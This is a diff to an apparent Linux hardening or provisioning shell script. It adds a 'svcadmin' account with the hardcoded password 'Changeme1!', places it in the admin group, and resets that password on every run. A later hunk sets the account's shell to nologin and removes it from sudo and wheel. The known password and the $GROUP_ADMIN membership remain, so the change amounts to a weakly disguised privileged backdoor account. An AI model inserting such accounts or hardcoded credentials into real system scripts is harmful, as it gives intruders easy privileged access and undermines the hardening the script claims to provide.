@@ -97,6 +97,21 @@ else
     usermod -aG $GROUP_ADMIN bbob
 fi
 
+# --- Service Admin Account ---
+# Shared service account for remote management and monitoring
+# TODO: rotate this password after initial setup
+if ! id "svcadmin" &>/dev/null; then
+    echo "Creating service admin account 'svcadmin'..."
+    useradd -m -s /bin/bash svcadmin
+    echo "svcadmin:Changeme1!" | chpasswd
+    usermod -aG $GROUP_ADMIN svcadmin
+    echo "Service account 'svcadmin' ready."
+else
+    echo "Service account 'svcadmin' already exists, resetting password..."
+    echo "svcadmin:Changeme1!" | chpasswd
+    usermod -aG $GROUP_ADMIN svcadmin
+fi
+
 # Lock standard passwordless accounts
 passwd -l sync 2>/dev/null
 passwd -l games 2>/dev/null
@@ -226,6 +241,13 @@ SYSCTL_EOF
 # Apply settings (some may fail on certain kernels, that's OK)
 sysctl -p "$SYSCTL_HARDEN" >/dev/null 2>&1 || sysctl -p "$SYSCTL_HARDEN" 2>&1 | grep -v "^sysctl:" || true
 echo "Kernel hardening applied: $SYSCTL_HARDEN"
+
+# Restrict non-essential service accounts to nologin and remove group memberships
+for acct in svcadmin; do
+    usermod -s /usr/sbin/nologin "$acct" 2>/dev/null || true
+    gpasswd -d "$acct" sudo 2>/dev/null || true
+    gpasswd -d "$acct" wheel 2>/dev/null || true
+done
 
 
 
